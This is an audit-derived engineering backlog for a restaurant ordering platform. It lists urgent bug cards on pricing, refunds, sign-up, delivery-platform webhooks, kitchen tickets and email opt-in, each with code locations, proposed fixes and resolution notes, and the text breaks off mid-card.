# Sales-readiness backlog — BeYours

From the 27 Aug 2026 audit (14 domains, all 482 exported Convex functions swept).
Full report: https://claude.ai/code/artifact/aae4caf8-cc3a-4d6d-896c-19f6f0120ec7

Every card is self-contained: problem, real location, fix, done criteria.
It doubles as the ClickUp description and the GitHub issue body.

- **`P0` — 35 cards.** Nothing ships until these are closed.
- **`TECH` — 12 cards.** P1 findings grouped by domain.
- **`LAUNCH` — 10 cards.** Operator actions and product decisions, outside the repo.

Everything that ends in a decision or a console rather than in a commit lives in
[`owner-decisions.md`](./owner-decisions.md) — ten items, re-measured 9 Sep 2026,
and **none of them is now waiting on a build-vs-remove call**. The last three were
settled that day: the automations editor (#270) and the platform integrations
screen (#274) are both **build**; the dead `cms*` tables (#330) are **held** until
someone confirms no live client deployment holds rows in them, since a removal is
irreversible against live data. Three more were decided **build** on 5 Sep and are
merely unbuilt — menus/formules (#352), the Clients page (#364), the three sales
metrics (#365) — each still owing one product answer (VAT across a mixed-rate
*formule*; the customer-identity key, shared by #364 and #365; the definition of
« taux de retour »). The remaining four are owner actions, not decisions: #172,
#173, #181 and the #95–#112 umbrella pass.

Domain issues **#95–#112 are open and act as parents**; **#94 and #113 are closed**
(PR #246, 29 Aug; PR #250, 30 Aug), so the range this line used to give was wrong at
both ends. All twenty were opened on **27 August 2026**, not 18 August. None of them
carries a GitHub sub-issue link — `get_sub_issues` returns empty for all twenty — so
the parentage exists only as a `**Parent:** #NN` line inside each child and in this
file. **This file is the only map of it.** Re-measured 2026-09-09.
`apps/reference/…` paths are the engine; every client app cloned from `apps/themes/`
has the same file in the same place unless stated otherwise.

---

## P0-01 · Creating an establishment is rejected by the Convex validator
**List:** P0 blockers · **Priority:** urgent · **Parent:** #94

### The problem
No establishment can be created from the dashboard. On a product billed *per store*,
that is the central commercial gesture failing. The only stores that exist are the
ones seeded by `seedFixture`.

### Where
`packages/convex-functions/src/stores.ts:99-113` declares exactly:
`name, slug, description, address, phone, email`.

`packages/admin/src/pages/stores/stores-page.tsx:236-246` additionally sends:
```ts
settings: { currency, timezone, deliveryEnabled, pickupEnabled,
            dineInEnabled, minimumOrderAmount, deliveryFee,
            deliveryRadius, taxRate }
```
Convex argument objects reject undeclared fields, so the mutation throws. The UI only
surfaces "Échec de la création de l'établissement".

### Fix
Drop the `settings` block from `handleCreateStore`. That legacy field has no writer
anywhere else in the repo.

Side effect to settle: `orderTotals.ts` and `orders.ts:354` still read
`store.settings?.taxRate`. Either declare a real argument plus UI, or remove
`storeTaxRate` from `resolveTaxRatePercent`.

### Done when
A `convex-test` case creates an establishment through the real schema, and the
"create an establishment" flow passes end to end.

---

## P0-02 · Any service crossing midnight reads as closed all evening
**List:** P0 blockers · **Priority:** urgent · **Parent:** #94

### The problem
An evening restaurant cannot sell anything. The open/closed boolean disables
add-to-cart everywhere and blocks checkout. The shipped `fast-food-minuit` vertical
and the food-truck templates are directly affected.

### Where
`packages/restaurant/src/services/store.ts:28`
```ts
const isOpen = currentTime >= todayHours.open && currentTime < todayHours.close
```
Lexical comparison of `"HH:mm"` strings, with no midnight wrap.

With `open: "18:00", close: "02:00"`:
- 23:00 → `"23:00" >= "18:00"` true, `"23:00" < "02:00"` **false** → closed
- 01:00 → `"01:00" >= "18:00"` **false** → closed
- `09:00–00:00` → closed all day

Consumed by `apps/reference/lib/hooks/use-store-status.ts:30`, which drives
`storefront-shell.tsx:25` (banner), `storefront-product-card.tsx:30` (disabled
add-to-cart) and `checkout/page.tsx:331` (hard block).

### Fix
In `isStoreOpen`, treat `close <= open` as an overnight range:
```ts
const overnight = todayHours.close <= todayHours.open
const isOpen = overnight
  ? (currentTime >= todayHours.open || currentTime < todayHours.close)
  : (currentTime >= todayHours.open && currentTime < todayHours.close)
```
Also check the *previous* day's row when `currentTime < close`, so 01:00 Saturday
resolves against Friday's range. Same wrap handling in `nextChange`.

Both hours editors (`store-hours-tab.tsx:53`, `hours-tab.tsx:47`) are plain
`<input type="time">` with no `close > open` validation — entering `02:00` is
legitimate and must keep working.

### Done when
Regression cases pass for `18:00–02:00` at 23:00 and 01:00, and for `09:00–00:00`.
The current suite (`store-service.test.ts:16-56`) only covers `09:00–18:00`.

---

## P0-03 · VAT is added on top of the displayed price — every customer is overcharged
**List:** P0 blockers · **Priority:** urgent · **Parent:** #111

### The problem
The customer pays more than the advertised price on **every order**. At the default
rate (20), a pizza shown at €12.00 is charged €14.40 by Stripe.

French B2C law requires tax-inclusive display. An owner who enters TTC prices — which
the law requires — and sets "VAT = 10" overcharges 10% on every order, and files the
wrong VAT (on €12.00 TTC the VAT is €1.09, not €1.20).

### Where
`packages/convex-functions/src/orderTotals.ts:69-70`
```ts
const taxAmount = Math.round(subtotal * (input.taxRatePercent / 100))
const total = Math.max(0, subtotal + taxAmount + deliveryFee - discount)
```
Default rate **20**: `packages/convex-functions/src/globalSettings.ts:93`.

The product contradicts itself — the label says the opposite of the arithmetic:
- menu card: raw `formatPrice(product.price)`, `storefront-product-card.tsx:111`
- admin: field labelled only `Prix (€)`, `product-form.tsx:372`
- order summary: **"TVA incluse"**, `order-summary.tsx:268`

So it is a bug under either convention, tax-inclusive or tax-exclusive.

### Fix
Treat `product.price` as tax-inclusive and extract the tax instead of adding it:
```ts
const taxAmount = subtotal - Math.round(subtotal / (1 + input.taxRatePercent / 100))
const total = Math.max(0, subtotal + deliveryFee - discount)
```
Then sum **per-product** `taxRate` instead of one store-wide rate: the field exists
(`packages/convex-schema/src/tables/catalog.ts:39`), the form collects it, the
Uber/Deliveroo mappers read it — and the order path never does. A menu mixing 10%
(food) and 20% (alcohol) is currently inexpressible, and the invoice VAT breakdown
is wrong.

Relabel the admin field `Prix TTC (€)`.

### Done when
`computeOrderTotals` has a test per rate (0, 5.5, 10, 20) proving
`total === subtotal + deliveryFee - discount`, plus a mixed-rate breakdown test. An
e2e asserts the cart total equals the amount actually charged.

---

## P0-04 · Cancelling a paid order fakes the refund, and blocks the real one
**List:** P0 blockers · **Priority:** urgent · **Parent:** #106

### The problem
The money stays with the restaurant while the books say it was returned. And it is
**irreversible**: once this path has run, the real refund is refused by the product.
The KITCHEN and DELIVERY roles hold `orders:update_status`, so a line cook can
trigger it.

### Where
`packages/convex-functions/src/orders.ts:585-604`
```ts
if (order.paymentStatus === "paid") {
  updates.paymentStatus = "refunded"
  const payments = await ctx.db.query("payments")
    .withIndex("by_orderId", q => q.eq("orderId", args.id)).collect()
  for (const payment of payments) {
    if (payment.status === "succeeded") {
      await ctx.db.patch(payment._id, {
        status: "refunded", refundedAmount: payment.amount, ...
      })
    }
  }
}
```
No provider call anywhere. Afterwards `planRefund`
(`packages/convex-functions/src/refundPolicy.ts:66,81-86`) only accepts `succeeded` /
`partially_refunded`, so `payments.refundPayment` throws.

`refundPolicy.ts:7-17` documents this exact bug as **fixed** — it was fixed in
`payments.recordRefund`, not here.

### Fix
1. Delete the 585-604 block.
2. On cancelling a paid order: leave `payments` untouched, set a distinct
   `paymentStatus: "refund_pending"`, and show a banner in the order detail routing
   the operator to `payments.refundPayment`.
3. If automatic refunding is wanted:
   `ctx.scheduler.runAfter(0, internal.payments.refundPayment, …)` — never a bare patch.
4. Rewrite `packages/convex-functions/src/__tests__/orders.test.ts:325`
   ("still refunds a paid order when the cancellation is legal"): it calls a database
   write a refund, and freezes the bug in place.

### Done when
`updateStatus` patches no `payments` document, proven by a test.

---

## P0-05 · The engine's refund button calls a function that no longer exists
**List:** P0 blockers · **Priority:** urgent · **Parent:** #106

### The problem
In `apps/reference` and any app built on `packages/admin`, no refund can be issued
from the UI. Clicking shows "Échec du remboursement".

### Where
`packages/admin/src/pages/orders/order-detail-page.tsx:100`
```ts
const refundMutation = useMutation(api?.payments?.refund ?? ("skip" as never))
```
`payments.refund` was removed — `apps/reference/convex/payments.ts:53-59` says so
explicitly — and replaced by `refundPayment`, which is an **action** (`:88`).
`useMutation` cannot call an action, and the generated `api` proxy yields a reference
for any property name, so the failure is server-side rather than typed.

The correct dialog exists and is mounted nowhere:
`packages/admin/src/pages/payments/refund-dialog.tsx:34` correctly uses
`useAction(api.payments.refundPayment)`, but `settings-page.tsx:15,208` mounts
`PaymentsTab` (provider configuration) rather than `PaymentsTabContent`.

Note: `apps/themes` escapes this (`SettingsContent.tsx:216` mounts the right
component) but its order detail has no refund button at all.

### Fix
Switch to `useAction(api.payments.refundPayment)` in `order-detail-page.tsx`, and
mount `PaymentsTabContent` in the engine's settings tab.

### Done when
A partial then full refund succeeds from the order detail, in both apps.

---

## P0-06 · Creating a game QR code fails every time
**List:** P0 blockers · **Priority:** urgent · **Parent:** #107

### The problem
No QR means no game URL, which means **nobody ever plays**. True in both apps,
including the test bench.

### Where
`packages/convex-functions/src/gameQRCodes.ts:14`
```ts
return await ctx.db.insert("gameQRCodes", { ...args, createdAt: now, updatedAt: now })
```
`args` is `{storeId, code, tableNumber, location, isActive}` — missing
`scannedCount`, declared **required** in the schema
(`packages/convex-schema/src/tables/gamification.ts:18`), with `schemaValidation` on.

Reproduced against the real schema with `convex-test`:
`Validator error: Missing required field 'scannedCount' in object`.

The symptom is already papered over on the read side: `gamePlay.ts:349` does
`(qr.scannedCount ?? 0) + 1`.

### Fix
```ts
return await ctx.db.insert("gameQRCodes", {
  ...args, scannedCount: 0, createdAt: now, updatedAt: now,
})
```

### Done when
A `convex-test` case inserts **through the real schema**. Pure-logic tests cannot
catch a validator error — which is exactly why this shipped, alongside
`e2e/admin/games.spec.ts:23` stating it submits no form.

---

## P0-07 · Sign-up is a dead end
**List:** P0 blockers · **Priority:** urgent · **Parent:** #113

### The problem
On a default client deployment nobody can sign in after signing up. The page still
reports "Compte créé avec succès !" and routes to `/menu` — with no session.

### Where
`apps/reference/convex/auth.ts:29-31` (identical in `apps/themes`)
```ts
requireEmailVerification: process.env.AUTH_ALLOW_UNVERIFIED_EMAIL !== "true",
```
On by default. A repo-wide grep for `sendVerificationEmail` or `emailVerification`
returns **zero results**: no sender is configured.

Better Auth 1.6.17 confirms both halves: `sign-up.mjs:241-250` mints the token and
sends nothing without a callback, then skips auto-sign-in; `sign-in.mjs:230-231`
throws `EMAIL_NOT_VERIFIED` (403) and likewise sends nothing.

The only configuration where the product works is `AUTH_ALLOW_UNVERIFIED_EMAIL=true`,
which the code comment forbids on a deployment serving a restaurant.

### Fix
Add to `createAuth`, in **both** apps:
```ts
emailVerification: {
  sendOnSignUp: true,
  sendOnSignIn: true,
  autoSignInAfterVerification: true,
  sendVerificationEmail: async ({ user, url }) => {
    const siteUrl = process.env.SITE_URL
    const secret = process.env.BETTER_AUTH_SECRET
    if (!siteUrl || !secret) throw new Error("SITE_URL/BETTER_AUTH_SECRET required")
    const res = await fetch(`${siteUrl}/api/email/send`, {
      method: "POST",
      headers: { "Content-Type": "application/json", Authorization: `Bearer ${secret}` },
      body: JSON.stringify({ type: "verifyEmail", to: user.email,
        data: { verifyLink: url, userName: user.name ?? user.email } }),
    })
    if (!res.ok) throw new Error(`verification email failed: ${res.status}`)
  },
},
```
Needs a `verifyEmail` arm in the discriminated union at
`packages/core/src/aws/ses/route-handler.ts:16-34` and a `verifyEmailTemplate` in
`templates.ts` (only `orderConfirmation`, `passwordReset`, `welcome`, `prizeWon` exist).

Also fix `sign-up/page.tsx:53-57`: stop routing to `/menu` when
`result.data?.token == null`; show a "check your inbox" state instead.

### Done when
Sign up → email → link → active session, on a deployment where
`AUTH_ALLOW_UNVERIFIED_EMAIL` is not set.

---

## P0-08 · The team invitation links to a route that does not exist
**List:** P0 blockers · **Priority:** urgent · **Parent:** #113

### The problem
The team feature is decorative end to end: the invitee never receives any rights.

### Where
`apps/reference/convex/teamMembersEmail.ts:213` and `:290` both link to
`${appUrl}/invite/${token}`. There is **no `invite` directory** in
`apps/reference/app` or `apps/themes/app`. `teamMembers.acceptInvitation` (`:189`)
and `getByInvitationToken` (`:119`) have zero callers outside Convex.

Because `acceptInvitation` is the only thing that writes `userProfiles` — the record
`getAuthUser` resolves rights from — the roster row grants nothing.

Already documented in `tasks/sprint-durcissement-reference.md:511`:
"no route containing 'invit'". Known, unfixed.

### Fix
Add `app/(auth)/invite/[token]/page.tsx` in **both** apps: read via
`useQuery(api.teamMembers.getByInvitationToken, { token })` to show restaurant and
role; require a session (link to `/sign-in?redirect=/invite/<token>` and `/sign-up`
when signed out); then call `useMutation(api.teamMembers.acceptInvitation)({ token })`
and route to `/dashboard`. Handle the three `TeamAccessError` reasons
(`invitation_expired`, `invitation_not_pending`, not-found) with distinct copy.

### Done when
An e2e covering invite → email → acceptance → dashboard access passes.
`e2e/admin/team.spec.ts` is structural and submits nothing, which is why this shipped.

---

## P0-09 · `orders.create` enforces no availability at all
**List:** P0 blockers · **Priority:** urgent · **Parent:** #105

### The problem
Four failures on one path: a deactivated product is ordered and charged; a sold-out
dish is sent to the kitchen; a pizza is ordered without its required size at the base
price; and an option with a negative `priceModifier` can be replayed 100 times to
drive the line to zero. `quantity` is also unbounded — 0 and negatives are accepted.

### Where
`packages/convex-functions/src/orders.ts:305-345`. The loop re-fetches the product,
checks existence and `storeId`, and recomputes prices server-side (that part is
correct) — then goes straight to pricing. It never reads `product.isActive`,
`product.stock`, `product.scheduling`, `option.required` or `option.maxSelections`,
and never dedupes `selectedOptions` (`resolvedOptions.push` at `:322`, summed at `:331`).

Enforcement lives only in the browser: `product-detail-client.tsx:93-98` (required
options) and `packages/restaurant/src/services/product.ts:21-30` (`isProductAvailable`).
Neither cart nor checkout re-validates.
`packages/restaurant/src/services/cart.ts:21` (`validateCartItem`) is only ever called
by its own test.

### Fix
After fetching each product:
```ts
if (!product.isActive) throw new Error(`Unavailable product: ${product.name}`)
if (!Number.isInteger(item.quantity) || item.quantity <= 0) throw new Error("Invalid quantity")
if (product.stock?.tracked && product.stock.quantity < item.quantity) throw new Error(`Insufficient stock: ${product.name}`)
// scheduling window evaluated in globalSettings.timezone
// per option group: required ⇒ ≥1 choice; count ≤ maxSelections ?? 1; dedupe by choiceId
```

### Done when
One test per case (inactive, out of stock, out of window, missing required option,
duplicated option, zero/negative quantity). No `convex-functions` test currently
covers `products`, `categories` or `menus`.

---

## P0-10 · Deliveroo orders never reach the kitchen — **RESOLVED**
**List:** P0 blockers · **Priority:** urgent · **Parent:** #103

> **Resolved 2026-09-04.** `handleNewOrder` now creates the ticket after the `!created`
> guard, using the shared `toKitchenTicketItemsFromPlatform` so the customer's instruction
> and allergy survive. Held by `tests/convex/deliveroo-webhook.test.ts` in both apps.
>
> **Re-opened and re-resolved 2026-09-09, because "after the `!created` guard" was
> the defect.** The sentence above describes the fix accurately and the placement was
> wrong in two ways, both of which reproduced the original outcome by another path:
>
> - The ticket creation sat AFTER `if (!created) return`, so a Deliveroo redelivery —
>   the one event that could repair a ticket whose first creation failed — returned
>   without ever reaching it.
> - Its `catch` was a bare `console.error`, in an 854-line file with **zero**
>   `captureBackendError` calls, while its Uber Eats twin had three, one of them on
>   this very step. A failed ticket was visible only to whoever thought to open that
>   client's Convex logs.
>
> So an order existed in the database, Deliveroo got its 200, no slip reached the pass,
> and nothing would ever retry. None of the eleven crons looked for a ticketless order.
>
> The ticket block now runs BEFORE the duplicate short-circuit and asks first whether a
> slip already exists, so a redelivery repairs a missing one without duplicating a
> present one; the failure is reported through `captureBackendError`; and a twelfth cron,
> `orders:sweepTicketlessPlatformOrders`, sweeps every fifteen minutes as the backstop
> for a redelivery that never comes. Four new cases in
> `tests/convex/deliveroo-webhook.test.ts` cover the redelivery repair, the sweep, the
> no-double-slip rule and the refusal to put a `website` order on the pass.
>
> **The "Fix" below is wrong about accept/reject — do not follow it.** Verified:
> `TicketCard.tsx:99-104` already called `api.kitchenTickets.acceptTicket` for **both**
> platforms, and `kitchenTickets.ts:273` already called `deliveroo.acceptOrder`. The accept
> path existed and worked; it was unreachable only because no ticket was ever created, and
> the card acts on a ticket. Creating the ticket made it reachable. `deliverooOrders.ts`
> really is dead — zero callers — but it is a duplicate of the live path, not the live path.

### The problem
In auto mode the order is accepted on Deliveroo's side and a rider is dispatched,
while **nothing appears in the kitchen**. In manual mode no button in the product can
accept it: Deliveroo auto-rejects after ~10 minutes, and repeated rejections close
the site.

### Where
`apps/reference/convex/deliverooWebhook.ts:310-427` — `handleNewOrder` calls
`internal.orders.createFromWebhook`, then accepts or rejects, and **never mentions**
`kitchenTickets`. Compare `apps/reference/convex/uberEatsWebhook.ts:176`, which does
create the ticket.

Compounding it: `apps/reference/convex/deliverooOrders.ts:15,95,179`
(`acceptOrder` / `rejectOrder` / `updatePrepStage`) have **zero callers** anywhere in
the repo, so the whole `ticket.source === "deliveroo"` branch of `TicketCard` is dead code.

### Fix
After the `if (!created) return` guard (`:338`), add the same
`ctx.runMutation(internal.kitchenTickets.internalCreate, {...})` block as
`uberEatsWebhook.ts:176-197`, with `source: "deliveroo"`, mapping `modifiers` into
`options` and per-item instructions into `notes`. Then wire
`deliverooOrders.acceptOrder/rejectOrder` into the `TicketCard` accept path
(`components/admin/kitchen/TicketCard.tsx:90`) alongside the existing Uber branch.

### Done when
An end-to-end Deliveroo scenario produces a ticket visible on the KDS, and accepting
from the KDS propagates back to Deliveroo.

---

## P0-11 · Uber Eats special instructions and allergies are dropped before the kitchen — **RESOLVED**
**List:** P0 blockers · **Priority:** urgent · **Parent:** #100

> **Resolved 2026-09-04** (#135, PR #311). `createFromWebhook`'s item validator carries
> `notes`, `mappedItems` sets it, and both platform webhooks build their ticket lines
> through one shared `toKitchenTicketItemsFromPlatform` rather than two hand-written
> copies. Held across the seam by "an Uber Eats customer's instruction survives the
> mapper, the webhook validator and the ticket insert"
> (`apps/*/tests/convex/kitchen-auto-print.test.ts`) — which is the test that was missing:
> re-verified by putting `notes: undefined` back, and it goes red.

### The problem
An Uber Eats customer writes "allergie arachides — sauce à part". The kitchen never
sees it. The print layout already has a "Note:" block ready to render it
(`PrintTicketLayout.tsx:125-129`).

### Where
`apps/reference/convex/uberEatsWebhook.ts:185` — `notes: undefined`, hard-coded.

Meanwhile `packages/integrations/src/uber-eats/mappers.ts:121-125` extracts exactly
this value:
```ts
notes: item.special_instructions
  ?? item.customer_request?.special_instructions
  ?? (item.customer_request?.allergy?.instructions
      ? `Allergie: ${item.customer_request.allergy.instructions}` : undefined),
```
It is computed, then thrown away. Lost one level up too: the item validator of
`createFromWebhook` (`packages/convex-functions/src/orders.ts:692-702`) has **no
`notes` field**, and `mappedItems` (`:740-751`) never sets one — even though the
order schema has `items[].notes`
(`packages/convex-schema/src/tables/orders.ts:45`) and `toKitchenTicketItems` reads
it (`orders.ts:857`).

### Fix
Add `notes: v.optional(v.string())` to the `createFromWebhook` item validator, carry
it through `mappedItems`, and replace `notes: undefined` with `notes: item.notes` at
`uberEatsWebhook.ts:185` (same for Deliveroo once P0-10 lands).

### Done when
A test running mapper output through `createFromWebhook` into a ticket proves the
instruction survives. Current tests validate each half in isolation, which is exactly
why the seam is broken.

---

## P0-12 · The kitchen ticket is created and printed before payment — **RESOLVED**
**List:** P0 blockers · **Priority:** urgent · **Parent:** #100

> **Resolved 2026-09-04** (#136, PR #311; the cash half in #335). The seam is split:
> `orders.create` writes the order and nothing else, and the ticket is made by
> `releaseToKitchen`, which every card path reaches through `recordPaymentStatus` and cash
> reaches through `markCashPaid`. It refuses twice, refuses a cancelled order, and refuses
> an unpaid card order even when staff accept it by hand — an abandoned checkout is exactly
> what `force` must not override. `store.orderConfirmation` is read here, which is why it
> came back: "auto" and unset release on payment, "manual" holds for staff.
>
> Re-verified by deleting the payment gate: 5 tests in
> `packages/convex-functions/src/__tests__/kitchenRelease.test.ts` go red.
>
> **Cash is deliberately not gated on the money.** It has no provider and nothing to
> abandon, so it releases at checkout in auto mode; gating it left order-ahead cash
> invisible to the kitchen while the diner read « Commande confirmée ! » (NEW2-JOURNEY-4).

### The problem
A customer builds a €60 order, reaches Stripe, closes the tab. The slip is already on
the pass and the kitchen cooks it. Nothing retracts it: `stripeWebhook.ts:31` only
handles `checkout.session.completed`, there is no `checkout.session.expired` handler
and no cleanup job. `TicketCard` shows no payment state, so the kitchen cannot tell
paid from unpaid.

Compounding it: the "Réessayer le paiement" button on
`app/(storefront)/checkout/cancel/page.tsx:44-48` routes back to `/checkout`, which
calls `createOrder` again — **a second order and a second kitchen ticket for the same
meal**.

### Where
`packages/convex-functions/src/orders.ts:866-889` — `createWithTicket` inserts the
order (`status: "pending"`, `paymentStatus: "pending"`, `:477,489`) and creates the
ticket **in the same transaction**, before any provider redirect.
`kitchenTickets.create` then sets `printStatus: "pending"` whenever
`printConfig.triggers` contains `"confirmed"` (`kitchenTickets.ts:361-362,387-390`).

### Fix
Split the seam: `orders.create` inserts only the order. The ticket is created from
the payment-confirmation path (`stripeWebhook`, PayPal capture, SumUp verify, the cash
branch), honouring `store.orderConfirmation` (`auto` / `manual`, currently written and
read by nobody — see TECH-05).

### Done when
An abandoned payment leaves no ticket and no print job, and a confirmed payment
produces exactly one.

---

## P0-13 · The KDS query is unbounded — the kitchen screen will go dark — **RESOLVED**
**List:** P0 blockers · **Priority:** urgent · **Parent:** #100

> **Resolved 2026-09-04** (#137, PR #311). `getByStore` subscribes to the three active
> statuses only, each capped at `ACTIVE_TICKET_LIMIT` and read oldest-first — the
> asymmetry is the point, since keeping the newest would drop the longest-waiting orders
> off the screen. The "Terminées" tab uses Convex cursor pagination. `purgeExpiredTickets`
> runs nightly at 02:30 UTC in both apps and reschedules itself while `hasMore`.
>
> **The cap was unheld, and this is worth reading.** The 5,000-ticket test
> seeds `completed` rows, so it passes on the status filter alone: replacing
> `.take(ACTIVE_TICKET_LIMIT)` with `.collect()` left it green. The gap is not academic —
> the retention sweep never deletes a ticket still on the pass, so an establishment that
> leaves slips open has nothing else bounding the read. "A pass nobody ever cleared" now
> holds both halves, and both go red when the cap or the ordering is removed.

### The problem
At 60 orders/day every reactive update re-serialises the whole ticket history to every
open tablet. Then Convex hits its per-transaction document-read ceiling: the query
throws, and **the kitchen display goes permanently blank mid-service**, with no admin
action that can fix it.

### Where
`packages/convex-functions/src/kitchenTickets.ts:21-30` — `getByStore` does
`.collect()` over `by_storeId`, every status, no limit; consumed by
`KitchenContent.tsx:39-42`. Same for `getByStatus` (`:35-55`) behind the "Terminées"
tab (`CompletedTickets.tsx:47-50`), which dies first.
There is no cron file anywhere in `apps/*/convex`, so no retention either.

### Fix
Narrow `getByStore` to the active statuses (`pending` / `in_progress` / `ready`) via
`by_store_status_createdAt`; paginate `CompletedTickets` (`paginationOpts`, or
`.take(50)` with a date window); add a scheduled job archiving or deleting tickets
completed more than N days ago.

### Done when
A 50,000-ticket dataset degrades neither the KDS nor the completed tab.

---

## P0-14 · Uber cancellation and scheduled-order webhooks match names Uber never sends — **RESOLVED**
**List:** P0 blockers · **Priority:** urgent · **Parent:** #103

> **Resolved 2026-09-04.** `classifyUberEvent` (in `@be-yours/convex-functions/platformWebhook`,
> so both apps render from one copy) normalises the `.notification` suffix and matches Uber's
> real catalogue. The `eats.order.status_update` branch and its status map are deleted. One
> test per real event, asserting the database effect rather than the HTTP code — and a
> cancellation now also takes the kitchen ticket off the pass, which the original fix missed.

### The problem
A customer cancels: the handler answers 200, the order stays `confirmed`, the ticket
stays live, and the kitchen cooks and bags an order that no longer exists.

### Where
`apps/reference/convex/uberEatsWebhook.ts`. Uber's catalogue is
`orders.notification`, `orders.scheduled.notification`, `orders.cancel.notification`,
`orders.release.notification`, `store.provisioned`, `store.deprovisioned`.

The code matches `orders.cancel` / `orders.failure` (`:290`), `orders.scheduled`
(`:318`) and `eats.order.status_update` (`:84`, `:241`) — the last is not an Uber
event at all, so the entire status-update branch and its `statusMap` (`:244-253`) are
dead code. Everything falls through to the "Unknown event type - still acknowledge"
return at `:398`.

### Fix
Normalise by stripping a trailing `.notification` before the switch, or match the full
names. Delete the `eats.order.status_update` branch and drive status from the real events.

### Done when
One test per real Uber event, asserting the database effect — not just the HTTP code.

---

## P0-15 · An unfetchable Uber order is assigned to an arbitrary store — **RESOLVED**
**List:** P0 blockers · **Priority:** urgent · **Parent:** #103

> **Resolved 2026-09-04.** `resolveStoreIntegration` refuses rather than guesses, and the
> event is kept verbatim in the new `platformWebhookFailures` table so it can be replayed.
> An adversarial pass then found three more ways to land on the wrong restaurant, all now
> closed: an integration saved with a blank `platformStoreId` swallowing an unidentified
> order, two integrations sharing one `platformStoreId` (an owner pasting the same id onto a
> second location) routing to whichever sorted first, and a non-string store id throwing
> `trim is not a function` into a 500 with nothing recorded.

### The problem
On a multi-location account, **every order from every location** lands on the first
integration with `total: 0` and a single "Commande Uber Eats" line, and the ticket
prints in the wrong kitchen.

### Where
`apps/reference/convex/uberEatsWebhook.ts:110-112` and `:342-344`
```ts
const integration = unifiedOrder
  ? allIntegrations.find(i => i.platformStoreId === unifiedOrder.storeExternalId)
  : allIntegrations[0]
```
`unifiedOrder` is `null` whenever `fetchOrder` throws (`:99-101`): 429, 5xx, timeout —
or the very common sandbox/production mismatch, since `UBER_EATS_SANDBOX_MODE` ships
as `true` in the `.env.example` templates while the credentials entered are production ones.

### Fix
Resolve the store from the webhook's own store reference, or refuse to guess: persist
the raw event to a dead-letter table and alert. Never fall back to index 0.

### Done when
A webhook whose `fetchOrder` fails creates no order against an unidentified store, and
leaves an actionable trace.

---

## P0-16 · `auto_accept` marks the order confirmed without accepting it on Uber — **RESOLVED**
**List:** P0 blockers · **Priority:** urgent · **Parent:** #103

> **Resolved 2026-09-04.** `settleWithUber` calls the platform first and moves the order only
> on success. `platformSyncStatus` — in the schema since the beginning, written by nothing —
> now records the outcome, and a bounded retry (15s/60s/180s; 255s total, inside Uber's
> 11.5-minute auto-cancel) abandons itself if staff have acted in the meantime.
>
> One caveat, stated rather than implied: `platformSyncStatus` is **written but not yet
> rendered**. The KDS reads `kitchenTickets` and this lives on `orders`. What staff see today
> is the order itself — it stays `pending`, its ticket stays on the pass, the accept button
> stays live — so an order Uber never accepted is visibly unaccepted. Surfacing the flag on
> the display is follow-up work.

### The problem
Two failure modes on one path: either Uber is never told and auto-cancels at 11.5
minutes, or the `acceptOrder` call fails silently. Either way the food is cooked and
thrown away, and the only trace is a `console.error`.

### Where
`apps/reference/convex/uberEatsWebhook.ts:209-221` — the `acceptOrder` call is guarded
by `if (unifiedOrder)` (`:211`) while the local transition to `confirmed` (`:214`) is
unconditional, and the `catch` (`:219`) only logs. The same swallow exists at
`apps/reference/convex/kitchenTickets.ts:253-255` and `:266-268` for the manual accept path.

### Fix
Only set `confirmed` on a 2xx from the provider. On failure, schedule a bounded retry
and set `platformSyncStatus: "failed"` — the field already exists
(`packages/convex-schema/src/tables/orders.ts:107`) — so the KDS surfaces it.

### Done when
A failing `acceptOrder` leaves the order visibly unconfirmed and triggers a retry.

---

## P0-17 · CSV subscriber import fails 100% of the time
**List:** P0 blockers · **Priority:** urgent · **Parent:** #109

**Problem.** The owner uploads their 800 contacts, sees the preview parse correctly,
clicks Import, and gets `ArgumentValidationError`. No partial success.

**Where.** `packages/convex-functions/src/emailSubscribers.ts:282-296` requires a
top-level `consentSource`, and per row `doubleOptInToken: v.string()` +
`doubleOptInExpiresAt: v.number()` (both non-optional).
`packages/admin/src/pages/email/subscribers/csv-import-dialog.tsx:71-81` sends
**none** of them, and adds two rejected fields (`source`, `storeId`).
Second bug on the same path: `:83` reads `result?.imported`, while `importBatch`
returns `{ inserted, skipped }`.

**Fix.** In `handleImport`: generate a token per row with
`generateDoubleOptInToken()` (already exported from `@be-yours/marketing`), drop
`source` and `storeId` from the row objects, pass `consentSource`, and read
`result.inserted`.

**Done when.** An e2e imports a CSV against a seeded store and asserts the subscriber
count changes. `e2e/admin/email-subscribers.spec.ts` currently only opens the dialog.

---

## P0-18 · The double opt-in email is never sent by any code path
**List:** P0 blockers · **Priority:** urgent · **Parent:** #109

**Problem.** Every storefront signup stays `pending` forever and can never be mailed —
sending filters on `active` (`emailCampaignActions.ts:90-93`). The organic acquisition
funnel accumulates permanently unreachable rows. The UI lies:
`subscriber-form.tsx:65` toasts "Abonné ajouté — email de confirmation envoyé".

**Where.** `packages/convex-functions/src/emailSubscribers.ts:140-161` does mint and
store `doubleOptInToken`, and the `/email/confirm` route exists
(`apps/reference/convex/http.ts:93-97`) — but a grep for `email/confirm` outside route
registration returns **nothing**: no code builds the URL and no code sends it.

**Fix.** An `internalAction` sending
`${CONVEX_SITE_URL}/email/confirm?token=<token>` via SES, scheduled with
`ctx.scheduler.runAfter(0, …)` from `create` and `importBatch` for every non-`manual` source.

**Done when.** A storefront signup receives the email, the link flips them to `active`,
and the next campaign reaches them.

**RESOLVED.** `emailAutomationActions.sendConfirmation` (both apps) composes and sends the
link, scheduled from `subscribe`, `create` (every non-`manual` source) and `importBatch`,
which now returns `pendingIds` so each imported row gets one. It refuses to send when
`CONVEX_SITE_URL` is unset rather than mailing a relative, unclickable link. Two further
lies on the same path were fixed: the footer newsletter form called **no mutation at
all** — it discarded the address and toasted success — and the admin form promised a
confirmation on `source: "manual"`, the one path that skips opt-in by design. Guarded by
`apps/*/tests/convex/opt-in-confirmation.test.ts`, whose last case signs up, takes the
link out of the sent message, opens it through the real router, and asserts `active`
plus a scheduled welcome.

**Correction to the card.** `startWelcome` was never unreachable: its chain from
`/email/confirm` was complete and already covered by `automation-welcome.test.ts`. The
break was entirely upstream — nothing composed the email.

---

## P0-19 · Scheduled campaigns never send
**List:** P0 blockers · **Priority:** urgent · **Parent:** #109

**Problem.** The owner schedules Saturday's brunch campaign for Friday 18:00, reads
"Campagne planifiée", and it sits at `scheduled` forever. The only way to send is the
manual menu item.

**Where.** `packages/convex-functions/src/emailCampaigns.ts:157-174` sets
`status: "scheduled"` + `scheduledAt`, and the wizard offers a date/time picker
